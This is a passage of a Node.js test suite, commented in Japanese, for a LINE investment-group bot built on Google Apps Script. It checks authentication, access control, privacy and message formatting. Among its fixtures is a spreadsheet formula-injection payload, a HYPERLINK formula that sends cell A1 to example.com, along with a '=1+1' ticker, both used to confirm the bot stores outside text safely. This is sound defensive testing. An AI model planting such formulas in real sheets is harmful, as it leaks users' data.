// ボットと画面の API のテスト（本番のシート・LINE には触らない）。
//   node --test test/
// 道具は q-oqrn の tools/qtest（となりに q-oqrn を置いておく）。決まりは q-oqrn の docs/security.md。
"use strict";
const test = require("node:test");
const assert = require("node:assert");
const path = require("node:path");
const { createGas, response } = require(path.join(__dirname, "../../q-oqrn/tools/qtest/fake-gas.js"));

const GROUP = "C" + "1".repeat(32);
const OTHER_GROUP = "C" + "2".repeat(32);
const MEMBER = "U" + "a".repeat(32);
const NEWCOMER = "U" + "b".repeat(32);
const ADMIN = "U" + "c".repeat(32);
const OUTSIDER = "U" + "d".repeat(32);
const CHANNEL = "2011004889";
const FORMULA = '=HYPERLINK("https://example.com/?x="&A1,"見て")';

// 画面の印（ID トークン）と、その持ち主
const TOKENS = { "tok-member": MEMBER, "tok-admin": ADMIN, "tok-outsider": OUTSIDER, "tok-newcomer": NEWCOMER };
// グループにいる人と、LINE の名前
const GROUP_MEMBERS = { [GROUP]: { [MEMBER]: "メンバー", [NEWCOMER]: FORMULA, [ADMIN]: "管理者" }, [OTHER_GROUP]: { [OUTSIDER]: "よその人" } };

function lineFetch(url, opt) {
  if (/\/oauth2\/v2\.1\/verify$/.test(url)) {
    const p = opt.payload || {};
    const sub = TOKENS[p.id_token];
    if (!sub || p.client_id !== CHANNEL) return response(400, { error: "invalid_request" });
    return response(200, { sub, aud: CHANNEL, exp: Date.now() / 1000 + 3600 });
  }
  let m = url.match(/\/v2\/bot\/group\/([^/]+)\/member\/([^/?]+)$/);
  if (m) {
    const name = (GROUP_MEMBERS[decodeURIComponent(m[1])] || {})[decodeURIComponent(m[2])];
    return name ? response(200, { displayName: name, userId: decodeURIComponent(m[2]) }) : response(404, { message: "Not found" });
  }
  if (/\/v2\/bot\/group\/[^/]+\/summary$/.test(url)) return response(200, { groupName: "投資の会" });
  // 今月の送信数（共通の自己点検 selfcheck.gs が読む）
  if (/\/v2\/bot\/message\/quota\/consumption$/.test(url)) return response(200, { totalUsage: 10 });
  if (/\/v2\/bot\/message\/quota$/.test(url)) return response(200, { type: "limited", value: 200 });
  if (/google\.com\/finance\/quote\/7203/.test(url)) {
    // 相場のページの文字も「外からの文字」
    return response(200, `<div>7203:TYO</div><div>${FORMULA.replace(/"/g, "&quot;")}</div><div>¥3,000</div><div>+1.20%</div>`);
  }
  if (/google\.com\/finance/.test(url)) return response(404, "");
  return response(200, {});
}

// setupInvestmentGroupBot と同じシートを作る（偽物の GAS は、シートを隠す操作を持っていないので、隠すところだけ飛ばす）
function setupSheets(gas) {
  const book = gas.eval("SpreadsheetApp.openById('SPREADSHEET_TEST')");
  const src = require("node:fs").readFileSync(path.join(__dirname, "../src/00_run.gs"), "utf8");
  const calls = [...src.matchAll(/ensureSheetWithHeaders_\(spreadsheet, ([^,]+), \[([\s\S]*?)\]\);/g)];
  calls.forEach((m) => {
    const name = m[1].startsWith("'") ? m[1].slice(1, -1) : gas.eval(m[1]);
    const headers = [...m[2].matchAll(/'([^']+)'/g)].map((h) => h[1]);
    gas.call("ensureSheetWithHeaders_", book, name, headers);
  });
  gas.call("seedOrUpdateDefaultRule_");
}

function make(extraProps = {}) {
  const gas = createGas({
    dir: path.join(__dirname, "../src"),
    properties: {
      SPREADSHEET_ID: "SPREADSHEET_TEST",
      LINE_CHANNEL_ACCESS_TOKEN: "test-token",
      WEBHOOK_KEY: "hook-secret",
      ADMIN_USER_IDS: ADMIN,
      ALLOWED_GROUP_IDS: GROUP,
      ALLOWED_USER_IDS: [MEMBER, OUTSIDER].join(","),
      LIFF_APP_BASE_URL: "https://katsuan.github.io/investment/liff/",
      ...extraProps,
    },
    fetch: lineFetch,
  });
  setupSheets(gas);
  gas.seed("WATCHLIST", [
    gas.rows("WATCHLIST")[0],
    [GROUP, "6758", "ソニーグループ", "", "2026-10-01 09:00:00", "6758:TYO", "3000", "", "", "", MEMBER, "メンバー", true, "", "", "", "2026-10-01 09:00:00"],
  ]);
  gas.seed("MEMBERS", [gas.rows("MEMBERS")[0], [GROUP, MEMBER, "メンバー", "", "2026-10-01 09:00:00", 1, true, ""]]);
  gas.reset();
  fresh(gas);
  return gas;
}

// 本物の GAS は、呼び出しのたびに新しく始まる。偽物では、1回の呼び出しの中だけの覚えを消してから呼ぶ
function fresh(gas) {
  // 偽物にない Utilities.formatString（%s と %% だけ使っている）
  gas.eval("if (!Utilities.formatString) Utilities.formatString = function (f) { var a = Array.prototype.slice.call(arguments, 1); return String(f).replace(/%%|%s/g, function (m) { return m === '%%' ? '%' : String(a.shift()); }); };");
  gas.eval("clearTableDataMemo_(); SPREADSHEET_MEMO_ = null; SCRIPT_PROPERTIES_MEMO_ = null; EVENT_LOG_HEADERS_MEMO_ = null;" +
    "Object.keys(MEMBER_PROFILE_MEMO_).forEach(function (k) { delete MEMBER_PROFILE_MEMO_[k]; });");
  return gas;
}
const event = (gas, ev, opts = { key: "hook-secret" }) => fresh(gas).lineEvent(ev, opts);
const text = (gas, t, userId = MEMBER, opts = { key: "hook-secret" }) =>
  event(gas, { type: "message", replyToken: "r-" + Math.random(), source: { type: "group", groupId: GROUP, userId }, message: { type: "text", text: t } }, opts);
const replyTexts = (gas) => JSON.stringify(gas.replies());
const liff = (gas, params) => fresh(gas).doGet({ action: "liff_data", groupId: GROUP, view: "watchlist", ...params });

// ---- LINE の Webhook ----

test("Webhook：合言葉なし・ちがう合言葉の知らせは、何もしない", () => {
  for (const opts of [{}, { key: "wrong" }]) {
    const gas = make();
    text(gas, "#解除", ADMIN, opts);
    text(gas, "#グループ許可", ADMIN, opts);
    assert.equal(gas.replies().length, 0);
    assert.equal(gas.rows("WATCHLIST")[1][12], true, "注目が外れていない");
    assert.equal(gas.rows("EVENT_LOG").length, 1, "記録も増えない");
  }
});

test("Webhook：合言葉が合えば返事をする", () => {
  const gas = make();
  text(gas, "#ルール");
  assert.equal(gas.replies().length, 1);
});

test("グループの外（1対1）の知らせには、返事も記録もしない", () => {
  const gas = make();
  event(gas, { type: "message", replyToken: "r", source: { type: "user", userId: MEMBER }, message: { type: "text", text: "#ルール" } }, { key: "hook-secret" });
  assert.equal(gas.replies().length, 0);
  assert.equal(gas.rows("EVENT_LOG").length, 1);
});

test("管理者だけの操作：管理者でない人は、全部外す・グループ許可ができない", () => {
  const gas = make();
  text(gas, "#解除", MEMBER);
  assert.equal(gas.rows("WATCHLIST")[1][12], true);
  text(gas, "#グループ許可", MEMBER);
  assert.match(replyTexts(gas), /管理者だけ/);
  assert.equal(gas.call("getAllowedGroupIds_").length, 1);
});

test("ほかの人の注目は、入れた人か管理者しか外せない", () => {
  const gas = make({ ALLOWED_USER_IDS: [MEMBER, NEWCOMER].join(",") });
  text(gas, "#解除 6758", NEWCOMER);
  assert.equal(gas.rows("WATCHLIST")[1][12], true);
  assert.match(replyTexts(gas), /入れた人か管理者だけ/);
  text(gas, "#解除 6758", ADMIN);
  assert.equal(gas.rows("WATCHLIST")[1][12], false);
});

test("#Bot設定：ほかのグループの数は、管理者にだけ出す", () => {
  const gas = make();
  text(gas, "#Bot設定", MEMBER);
  assert.doesNotMatch(replyTexts(gas), /許可グループ数/);
  gas.reset();
  text(gas, "#Bot設定", ADMIN);
  assert.match(replyTexts(gas), /許可グループ数/);
});

test("返事や記録に、LINE のユーザー ID をそのまま出さない", () => {
  const gas = make();
  gas.seed("MEMBERS", [gas.rows("MEMBERS")[0], [GROUP, NEWCOMER, "", "", "", "", true, ""]]);
  text(gas, "#未確認");
  text(gas, "#ルール", OUTSIDER);
  assert.doesNotMatch(replyTexts(gas), new RegExp(NEWCOMER));
  const log = JSON.stringify(gas.rows("EVENT_LOG"));
  assert.doesNotMatch(log, /U[0-9a-f]{32}/);
});

// ---- 外の文字がシートに式のまま入らない ----

test("LINE の名前・相場のページの文字は、式のままシートに入らない", () => {
  const gas = make({ ALLOWED_USER_IDS: [MEMBER, NEWCOMER].join(",") });
  text(gas, "#7203", NEWCOMER); // 名前が = で始まる人が、銘柄名が = で始まる銘柄を入れる
  event(gas, { type: "postback", replyToken: "r", source: { type: "group", groupId: GROUP, userId: NEWCOMER }, postback: { data: "action=agree_rules&ruleVersion=1" } }, { key: "hook-secret" });
  assert.ok(gas.rows("WATCHLIST").length >= 3, "注目に入った");
  assert.ok(gas.rows("MARKET_DATA").length >= 2, "相場を覚えた");
  assert.deepEqual(gas.formulaCells(), []);
});

test("ルールの文（--- で始まる）も、式にならない", () => {
  const gas = createGas({ dir: path.join(__dirname, "../src"), properties: { SPREADSHEET_ID: "SPREADSHEET_TEST" }, fetch: lineFetch });
  setupSheets(gas);
  fresh(gas).call("updateDefaultRuleVersionOne");
  assert.deepEqual(gas.formulaCells(), []);
});

// ---- 画面（LIFF）からの呼び出し ----

test("画面：本人の印がない・偽の印・userId だけの呼び出しは断る", () => {
  const gas = make();
  assert.equal(liff(gas, {}).ok, false);
  assert.equal(liff(gas, { userId: MEMBER }).ok, false, "送られた userId は信じない");
  assert.equal(liff(gas, { idToken: "forged" }).ok, false);
  assert.equal(liff(gas, { idToken: "forged" }).error, "login required");
});

test("画面：グループにいて、ルールを確認した人は見られる", () => {
  const gas = make();
  const res = liff(gas, { idToken: "tok-member" });
  assert.equal(res.ok, true);
  assert.equal(res.data.items[0].ticker, "6758");
  const perf = liff(gas, { idToken: "tok-member", view: "performance" });
  assert.equal(perf.ok, true);
  assert.doesNotMatch(JSON.stringify(perf), /U[0-9a-f]{32}/, "ほかのメンバーの ID は返さない");
});

test("画面：よそのグループの人は、許可されていても見られない", () => {
  const gas = make();
  const res = liff(gas, { idToken: "tok-outsider" });
  assert.equal(res.ok, false);
  assert.equal(res.error, "access denied");
});

test("画面：ルールをまだ確認していない人は見られない", () => {
  const gas = make();
  assert.equal(liff(gas, { idToken: "tok-newcomer" }).ok, false);
});

test("画面：groupId・銘柄コードの形がちがうものは断る", () => {
  const gas = make();
  assert.equal(fresh(gas).doGet({ action: "liff_data", groupId: "x", view: "watchlist", idToken: "tok-member" }).ok, false);
  assert.equal(liff(gas, { idToken: "tok-member", view: "quote", ticker: "=1+1" }).ok, false);
  assert.equal(liff(gas, { idToken: "tok-member", view: "quote", ticker: "A".repeat(40) }).ok, false);
  assert.equal(gas.fetches.filter((f) => /google\.com\/finance/.test(f.url)).length, 0);
});

test("health はだれでも呼べるが、個人の情報を返さない", () => {
  const gas = make();
  const res = gas.doGet({ action: "health" });
  assert.doesNotMatch(String(res), /U[0-9a-f]{32}|C[0-9a-f]{32}/);
});

// ---- 返事のカード ----

test("主な返事は、LINE が受けつける形", () => {
  const gas = make({ ALLOWED_USER_IDS: [MEMBER, NEWCOMER].join(",") });
  ["#ルール", "#使い方", "#注目一覧", "#注目実績", "#Bot設定", "#未確認", "#7203", "#6758", "#解除 6758"].forEach((t) => text(gas, t));
  text(gas, "#ルール", OUTSIDER);
  event(gas, { type: "memberJoined", replyToken: "r", source: { type: "group", groupId: GROUP }, joined: { members: [{ type: "user", userId: NEWCOMER }] } }, { key: "hook-secret" });
  assert.ok(gas.replies().length >= 10);
  assert.deepEqual(gas.flexProblems().filter((p) => p.level === "error"), []);
});

// カードの中の押せるもの（ボタン・押せる箱）を全部ひろう
function cardActions(messages) {
  const found = [];
  (function walk(node) {
    if (!node || typeof node !== "object") return;
    if (node.action) found.push(node.action);
    Object.keys(node).forEach((k) => k !== "quickReply" && walk(node[k]));
  })(messages.filter((m) => m.type === "flex").map((m) => m.contents));
  return found;
}
// あとで押されても困らないもの：画面・URL を開く／文字を送る（聞き返す・#コードで新しく記録）／入力欄に文字を入れるだけ
// ルールの確認（agree_rules）は、押されるたびにボットが状態を見て返す（確認ずみ・古い版・ほかの人）ので、あとで押されてもよい
const isSafeLater = (a) => a.type === "uri" || a.type === "message" || (a.type === "postback" && /^action=(usage_prefill|agree_rules)/.test(a.data));
const agree = (gas, userId, data) =>
  event(gas, { type: "postback", replyToken: "r-" + Math.random(), source: { type: "group", groupId: GROUP, userId }, postback: { data } });

test("カードのボタンは、あとで押されても困らないものだけ（ルールの確認はカードとクイックリプライの両方）", () => {
  const gas = make({ ALLOWED_USER_IDS: [MEMBER, NEWCOMER].join(",") });
  ["#ルール", "#使い方", "#注目一覧", "#注目実績", "#Bot設定", "#7203", "#6758"].forEach((t) => text(gas, t));
  text(gas, "#注目一覧", OUTSIDER);
  event(gas, { type: "memberJoined", replyToken: "r", source: { type: "group", groupId: GROUP }, joined: { members: [{ type: "user", userId: NEWCOMER }] } });
  const all = gas.replies().flatMap((r) => r.messages);
  assert.deepEqual(cardActions(all).filter((a) => !isSafeLater(a)), []);
  // 入ってきた人・未確認の人には、カードのボタンとクイックリプライの両方に「確認しました」（同じ postback）
  const prompts = gas.replies().slice(-2).map((r) => r.messages[r.messages.length - 1]);
  prompts.forEach((m) => {
    const onCard = cardActions([m]).filter((a) => a.type === "postback" && /^action=agree_rules/.test(a.data));
    assert.equal(onCard.length, 1, "カードにも確認のボタン");
    assert.equal(onCard[0].displayText, "✅ ルールを確認しました");
    assert.ok(m.quickReply.items.some((it) => it.action.data === onCard[0].data), "クイックリプライと同じ");
    assert.doesNotMatch(JSON.stringify(m.contents), /出ていないとき/, "回り道の文はいらない");
    assert.deepEqual(gas.flexProblems([m]).filter((p) => p.level === "error"), []);
  });
});

test("未確認の人の #ルール には、確認のボタンを出しなおす", () => {
  const gas = make();
  text(gas, "#ルール", NEWCOMER);
  const last = gas.lastMessages().slice(-1)[0];
  assert.ok(last.quickReply.items.some((it) => it.action.data === `action=agree_rules&ruleVersion=1&targetUserIds=${encodeURIComponent(NEWCOMER)}`));
  gas.reset();
  text(gas, "#ルール", MEMBER);
  assert.ok(!JSON.stringify(gas.lastMessages()).includes("agree_rules"), "確認ずみの人には出さない");
});

test("古いボタン・ほかの人のボタン・2回目は、記録しなおさずにやさしく返す", () => {
  const gas = make();
  gas.seed("MEMBERS", [gas.rows("MEMBERS")[0], [GROUP, MEMBER, "メンバー", "", "2026-10-01 09:00:00", 1, true, ""], [GROUP, NEWCOMER, "", "", "", "", true, ""]]);
  agree(gas, OUTSIDER, `action=agree_rules&ruleVersion=1&targetUserIds=${NEWCOMER}`);
  assert.match(replyTexts(gas), /案内した人のため/);
  agree(gas, NEWCOMER, "action=agree_rules&ruleVersion=0");
  assert.match(replyTexts(gas), /ルールが新しくなりました/);
  assert.equal(gas.rows("MEMBERS")[2][5], "", "古い版では記録しない");
  agree(gas, MEMBER, "action=agree_rules&ruleVersion=1");
  assert.match(replyTexts(gas), /もう記録しています/);
  agree(gas, MEMBER, "action=something_old");
  assert.match(replyTexts(gas), /いまは使えません/);
  agree(gas, NEWCOMER, `action=agree_rules&ruleVersion=1&targetUserIds=${NEWCOMER}`);
  assert.equal(Number(gas.rows("MEMBERS")[2][5]), 1, "本人がいまの版で押せば記録する");
  assert.equal(gas.replies().length, 5, "どれにも返事をする");
});

test("カードが断られたら、文字だけを push で送りなおす（同じ返事の合図を2回使わない）", () => {
  let rejected = false;
  const gas = createGas({
    dir: path.join(__dirname, "../src"),
    properties: { SPREADSHEET_ID: "SPREADSHEET_TEST", LINE_CHANNEL_ACCESS_TOKEN: "t", WEBHOOK_KEY: "hook-secret", ALLOWED_GROUP_IDS: GROUP, ALLOWED_USER_IDS: MEMBER, LIFF_APP_BASE_URL: "https://katsuan.github.io/investment/liff/" },
    fetch: (url, opt) => {
      if (/message\/reply$/.test(url) && !rejected) {
        rejected = true;
        return response(400, { message: "A message (messages[0]) in the request body is invalid" });
      }
      return lineFetch(url, opt);
    },
  });
  setupSheets(gas);
  gas.reset();
  text(gas, "#使い方");
  assert.deepEqual(gas.reusedReplyTokens(), []);
  const pushed = gas.replies().filter((r) => r.kind === "push");
  assert.equal(pushed.length, 1);
  assert.equal(pushed[0].to, GROUP);
  assert.equal(pushed[0].messages[0].type, "text");
});

test("使う前の確かめのカードも、LINE が受けつける形", () => {
  const gas = make();
  const cards = gas.eval("Q_SELF_CHECK.cards()");
  assert.ok(cards.length >= 5);
  assert.deepEqual(gas.flexProblems(cards).filter((p) => p.level === "error"), []);
});

// ---- 見つけた不具合（直す前に、起きることを確かめるテスト） ----

const WATCH_ROW = (ticker, addedAt, userId, active, name = "メンバー") =>
  [GROUP, ticker, ticker + "の会社", "", addedAt, ticker + ":TYO", "3000", "", "", "", userId, name, active, "", "", "", addedAt];
const MARKET_ROW = (ticker, price, updatedAt, name = "ソニーグループ") =>
  [ticker, ticker + ":TYO", name, price, "", "", "", "", "", "", "", updatedAt, "parsed", "", "", "", ""];

test("シートの日時が日付の形で戻っても、注目一覧は新しい順で、時刻は日本時間の文字", () => {
  const gas = make();
  // 本物のシートは「2026-10-01 09:00:00」を日付に変えて返す（10/1 は木曜・10/2 は金曜）
  gas.seed("WATCHLIST", [gas.rows("WATCHLIST")[0],
    WATCH_ROW("6758", new Date("2026-10-01T00:00:00Z"), MEMBER, true),
    WATCH_ROW("7203", new Date("2026-10-02T00:00:00Z"), MEMBER, true)]);
  gas.seed("MARKET_DATA", [gas.rows("MARKET_DATA")[0],
    MARKET_ROW("6758", "3000", new Date("2026-10-02T06:00:00Z")),
    MARKET_ROW("7203", "2900", new Date("2026-10-02T05:00:00Z"), "トヨタ自動車")]);
  const res = liff(gas, { idToken: "tok-member" });
  assert.equal(res.ok, true);
  assert.deepEqual(res.data.items.map((i) => i.ticker), ["7203", "6758"], "新しい順");
  assert.equal(res.data.latestCachedAt, "2026-10-02 15:00:00", "日本時間の文字（画面は時刻をそのまま出す）");
  assert.equal(res.data.items[0].addedAt, "26/10/02");
});

test("株価が取れていない銘柄を、-100% と出さない", () => {
  const gas = make();
  gas.seed("MARKET_DATA", [gas.rows("MARKET_DATA")[0], MARKET_ROW("6758", "", "2026-10-02 09:00:00")]);
  const res = liff(gas, { idToken: "tok-member" });
  assert.equal(res.data.items[0].performanceDelta, "-");
  const perf = liff(gas, { idToken: "tok-member", view: "performance" });
  assert.equal(perf.data.ranking[0].averageDelta, null);
  assert.equal(perf.data.topSpotlight.items[0].currentDeltaText, "-");
});

test("グループ名に LINE が入っていても、送り主の名前で断られない", () => {
  const g = createGas({
    dir: path.join(__dirname, "../src"),
    properties: { SPREADSHEET_ID: "SPREADSHEET_TEST", LINE_CHANNEL_ACCESS_TOKEN: "t", WEBHOOK_KEY: "hook-secret", ALLOWED_GROUP_IDS: GROUP, ALLOWED_USER_IDS: MEMBER },
    fetch: (url, opt) => (/\/summary$/.test(url) ? response(200, { groupName: "LINE投資部" }) : lineFetch(url, opt)),
  });
  setupSheets(g);
  g.reset();
  text(g, "#ルール");
  const sender = g.replies()[0].messages[0].sender;
  assert.ok(sender && sender.name);
  assert.doesNotMatch(sender.name, /line/i);
});

test("LINE の断りの返事が JSON でなくても、文字だけで送りなおす", () => {
  let rejected = false;
  const g = createGas({
    dir: path.join(__dirname, "../src"),
    properties: { SPREADSHEET_ID: "SPREADSHEET_TEST", LINE_CHANNEL_ACCESS_TOKEN: "t", WEBHOOK_KEY: "hook-secret", ALLOWED_GROUP_IDS: GROUP, ALLOWED_USER_IDS: MEMBER },
    fetch: (url, opt) => {
      if (/message\/reply$/.test(url) && !rejected) {
        rejected = true;
        return response(400, "<html>Bad Request</html>");
      }
      return lineFetch(url, opt);
    },
  });
  setupSheets(g);
  g.reset();
  text(g, "#使い方");
  assert.equal(g.replies().filter((r) => r.kind === "push").length, 1);
});

test("ルールのシートが空でも、入ってきた人に案内を出す", () => {
  const gas = make();
  gas.seed("RULES", [gas.rows("RULES")[0]]);
  event(gas, { type: "memberJoined", replyToken: "r", source: { type: "group", groupId: GROUP }, joined: { members: [{ type: "user", userId: NEWCOMER }] } });
  assert.equal(gas.replies().length, 1);
  assert.deepEqual(gas.flexProblems().filter((p) => p.level === "error"), []);
});

test("株価のページに1つつながらなくても、ほかの市場をためす", () => {
  const g = createGas({
    dir: path.join(__dirname, "../src"),
    properties: { SPREADSHEET_ID: "SPREADSHEET_TEST", LINE_CHANNEL_ACCESS_TOKEN: "t", WEBHOOK_KEY: "hook-secret", ALLOWED_GROUP_IDS: GROUP, ALLOWED_USER_IDS: MEMBER },
    fetch: (url, opt) => {
      if (/finance\/quote\/TSLA\?/.test(url)) throw new Error("Address unavailable");
      if (/finance\/quote\/TSLA%3ANASDAQ/.test(url)) return response(200, "<div>TSLA:NASDAQ</div><div>Tesla Inc</div><div>$250.00</div><div>+1.00%</div>");
      return lineFetch(url, opt);
    },
  });
  setupSheets(g);
  g.reset();
  text(g, "#TSLA");
  const rows = g.rows("WATCHLIST");
  assert.equal(rows.length, 2, "注目に入った");
  assert.equal(rows[1][1], "TSLA");
});

test("同じ銘柄を同時に入れても、注目は1つだけ", () => {
  let gas = null;
  let seeded = false;
  gas = createGas({
    dir: path.join(__dirname, "../src"),
    properties: { SPREADSHEET_ID: "SPREADSHEET_TEST", LINE_CHANNEL_ACCESS_TOKEN: "t", WEBHOOK_KEY: "hook-secret", ALLOWED_GROUP_IDS: GROUP, ALLOWED_USER_IDS: [MEMBER, NEWCOMER].join(",") },
    fetch: (url, opt) => {
      // 株価を取りに行っているあいだに、ほかの人が同じ銘柄を入れた
      if (/finance\/quote\/7203/.test(url) && !seeded) {
        seeded = true;
        gas.seed("WATCHLIST", [gas.rows("WATCHLIST")[0], WATCH_ROW("7203", "2026-10-02 09:00:00", NEWCOMER, true, "新人")]);
      }
      return lineFetch(url, opt);
    },
  });
  setupSheets(gas);
  gas.reset();
  text(gas, "#7203");
  assert.equal(gas.rows("WATCHLIST").length, 2, "2つ目を足さない");
  assert.match(replyTexts(gas), /もう注目中/);
});

test("一度外して入れなおした銘柄も、#解除 で外せる", () => {
  const gas = make({ ALLOWED_USER_IDS: [MEMBER, NEWCOMER].join(",") });
  gas.seed("WATCHLIST", [gas.rows("WATCHLIST")[0],
    WATCH_ROW("6758", "2026-09-01 09:00:00", NEWCOMER, false, "新人"),
    WATCH_ROW("6758", "2026-10-01 09:00:00", MEMBER, true)]);
  text(gas, "#解除 6758", MEMBER);
  assert.match(replyTexts(gas), /注目から外しました/);
  assert.equal(gas.rows("WATCHLIST")[2][12], false);
});

test("全角の「＃」・数字でも、ことばとして受けつける", () => {
  const gas = make();
  text(gas, "＃ルール");
  assert.equal(gas.replies().length, 1);
  gas.reset();
  text(gas, "＃７２０３");
  assert.equal(gas.rows("WATCHLIST").length, 3, "注目に入った");
  assert.equal(gas.rows("WATCHLIST")[2][1], "7203");
});

// ---- 文かカードか（ux.md H10） ----

const lastMessage = (gas) => gas.lastMessages().slice(-1)[0];
const isGenericAlt = (alt) => !alt || /カードが届きました|^Flex|^メッセージ$/.test(alt);

test("ボットが入ったときの案内は、ことばを押して入れられるカード", () => {
  const gas = make();
  event(gas, { type: "join", replyToken: "r", source: { type: "group", groupId: GROUP } });
  const m = lastMessage(gas);
  assert.equal(m.type, "flex");
  assert.ok(!isGenericAlt(m.altText));
  assert.match(m.altText, /#7203/);
  // 打ちこむ言葉を、押して入力欄に入れられる
  assert.ok(cardActions([m]).some((a) => a.fillInText === "#ルール"));
  assert.ok(m.quickReply && m.quickReply.items.length > 0);
  assert.deepEqual(gas.flexProblems().filter((p) => p.level === "error"), []);
});

test("#未確認 は、名前の一覧のカード（いない人の ID は出さない）", () => {
  const gas = make();
  gas.seed("MEMBERS", [gas.rows("MEMBERS")[0], [GROUP, MEMBER, "メンバー", "", "", 1, true, ""], [GROUP, NEWCOMER, "新人さん", "", "", "", true, ""]]);
  text(gas, "#未確認");
  const m = lastMessage(gas);
  assert.equal(m.type, "flex");
  assert.match(m.altText, /1人/);
  assert.match(JSON.stringify(m.contents), /新人さん/);
  assert.doesNotMatch(JSON.stringify(m), new RegExp(NEWCOMER));
  assert.deepEqual(cardActions([m]).filter((a) => !isSafeLater(a)), []);
  gas.seed("MEMBERS", [gas.rows("MEMBERS")[0], [GROUP, MEMBER, "メンバー", "", "", 1, true, ""]]);
  gas.reset();
  text(gas, "#未確認");
  assert.match(lastMessage(gas).altText, /全員/);
  assert.deepEqual(gas.flexProblems().filter((p) => p.level === "error"), []);
});

test("注目を外したら「↩ コード を戻す」で入れなおせる", () => {
  const gas = make();
  text(gas, "#解除 6758");
  const m = lastMessage(gas);
  assert.equal(m.type, "text");
  assert.ok(m.quickReply.items.some((it) => it.action.type === "message" && it.action.text === "#6758"));
});

test("文の返事にも、次に押せる操作が付いている", () => {
  const gas = make({ ALLOWED_USER_IDS: [MEMBER, NEWCOMER].join(",") });
  ["#解除 9999", "#解除"].forEach((t) => text(gas, t));
  text(gas, "#解除 6758", NEWCOMER);
  agree(gas, MEMBER, "action=something_old");
  agree(gas, OUTSIDER, `action=agree_rules&ruleVersion=1&targetUserIds=${NEWCOMER}`);
  const texts = gas.replies().map((r) => r.messages[r.messages.length - 1]);
  assert.equal(texts.length, 5);
  texts.forEach((m) => assert.ok(m.quickReply && m.quickReply.items.length > 0, m.text));
});

// ---- 管理者のテストの窓口（ux.md H11） ----

const dm = (gas, userId, ev) => event(gas, { replyToken: "d-" + Math.random(), source: { type: "user", userId }, ...ev });
const dmText = (gas, userId, t) => dm(gas, userId, { type: "message", message: { type: "text", text: t } });
const dmTap = (gas, userId, data) => dm(gas, userId, { type: "postback", postback: { data } });
const snapshot = (gas) => JSON.stringify(["GROUPS", "MEMBERS", "RULES", "EVENT_LOG", "WATCHLIST", "MARKET_DATA"].map((n) => gas.rows(n))) +
  gas.eval("JSON.stringify(PropertiesService.getScriptProperties().getProperties())");

test("テストの窓口：管理者が 1:1 で #テスト・#test と送ると 🧪 のカードが返る", () => {
  const gas = make();
  for (const t of ["#テスト", "#test", "＃ＴＥＳＴ"]) {
    gas.reset();
    dmText(gas, ADMIN, t);
    const m = lastMessage(gas);
    assert.equal(m.type, "flex", t);
    assert.match(m.altText, /🧪/);
    assert.ok(m.quickReply.items.length >= 4);
  }
});

test("テストの窓口：ふつうの人の 1:1・グループでは反応しない（#test を銘柄とも見ない）", () => {
  const gas = make();
  dmText(gas, MEMBER, "#テスト");
  dmTap(gas, MEMBER, "action=qtest&kind=samples&page=1");
  text(gas, "#テスト", ADMIN);
  text(gas, "#test", ADMIN);
  text(gas, "#test", MEMBER);
  assert.equal(gas.replies().length, 0);
  assert.equal(gas.fetches.filter((f) => /google\.com\/finance/.test(f.url)).length, 0);
});

test("テストの窓口：どれを押しても reply で返り、本物には書かない・push しない", () => {
  const gas = make();
  const before = snapshot(gas);
  dmText(gas, ADMIN, "#テスト");
  const menuItems = lastMessage(gas).quickReply.items;
  menuItems.forEach((it) => dmTap(gas, ADMIN, it.action.data));
  dmTap(gas, ADMIN, "action=qtest&kind=sample_tap");
  const replies = gas.replies();
  assert.equal(replies.length, 1 + menuItems.length + 1, "押したら必ず返事");
  assert.ok(replies.every((r) => r.kind === "reply"), "push を使わない");
  assert.deepEqual(gas.reusedReplyTokens(), []);
  replies.forEach((r) => {
    assert.ok(r.messages.length <= 5);
    r.messages.forEach((m) => assert.match(m.type === "text" ? m.text : m.altText, /🧪/, "見本には 🧪"));
  });
  assert.deepEqual(gas.flexProblems().filter((p) => p.level === "error"), []);
  assert.equal(snapshot(gas), before, "シート・設定に書かない");
  // 見本の中で押せるものは、画面を開くか、テストの窓口に返るものだけ
  const samples = replies.flatMap((r) => r.messages).filter((m) => m.type === "flex" && /見本/.test(m.altText));
  assert.ok(samples.length >= 10);
  cardActions(samples).forEach((a) => assert.ok(a.type === "uri" || /^action=qtest/.test(a.data), JSON.stringify(a)));
  // 断られたときの文
  assert.ok(replies.some((r) => /文字だけで返しました/.test(JSON.stringify(r.messages))));
});

test("カードの「確認しました」を何日もあとに押しても、ボットが状態を見て返す", () => {
  const gas = make();
  text(gas, "#ルール", NEWCOMER);
  const data = cardActions(gas.lastMessages()).find((a) => /^action=agree_rules/.test(a.data)).data;
  agree(gas, NEWCOMER, data);
  assert.match(replyTexts(gas), /ルールの確認を記録しました/);
  assert.equal(gas.call("getAllowedUserIds_").includes(NEWCOMER), true);
  gas.reset();
  agree(gas, NEWCOMER, data); // 同じカードを、あとでもう一度
  assert.match(replyTexts(gas), /もう記録しています/);
  gas.reset();
  agree(gas, MEMBER, data); // ほかの人が押した
  assert.match(replyTexts(gas), /案内した人のため/);
});

// ---- ファイルの並べ方とコメント（q-oqrn docs/structure.md） ----

const fs = require("node:fs");
const SRC = path.join(__dirname, "../src");
const gsFiles = () => fs.readdirSync(SRC).filter((f) => f.endsWith(".gs"));

test("selfcheck.gs は q-oqrn の写しと同じ", () => {
  const ours = fs.readFileSync(path.join(SRC, "selfcheck.gs"), "utf8");
  const original = fs.readFileSync(path.join(__dirname, "../../q-oqrn/tools/qtest/selfcheck.gs"), "utf8");
  assert.equal(ours, original);
});

test("「実行」の一覧に出る関数（名前が _ で終わらない）は、人が実行するものと入口だけ", () => {
  const found = {};
  gsFiles().forEach((f) => {
    for (const m of fs.readFileSync(path.join(SRC, f), "utf8").matchAll(/^function ([A-Za-z0-9]+[A-Za-z0-9]*[^_\s(])\(/gm)) found[m[1]] = f;
  });
  assert.deepEqual(found, {
    checkAll: "00_run.gs", setupInvestmentGroupBot: "00_run.gs", refreshActiveWatchlistMarketCaps: "00_run.gs", updateDefaultRuleVersionOne: "00_run.gs",
    doPost: "01_entry.gs", doGet: "01_entry.gs", runLineGroupBotPost: "01_entry.gs", runLineGroupBotGet: "01_entry.gs",
    qCheckAll: "selfcheck.gs", qHeartbeat: "selfcheck.gs", safeCell: "selfcheck.gs",
  });
});

test("ファイルの先頭と、関数の前に、コメントがある", () => {
  gsFiles().filter((f) => f !== "selfcheck.gs").forEach((f) => {
    const lines = fs.readFileSync(path.join(SRC, f), "utf8").split("\n");
    assert.match(lines[0], /^(\/\*\*|\/\/)/, f + " の先頭");
    lines.forEach((line, i) => {
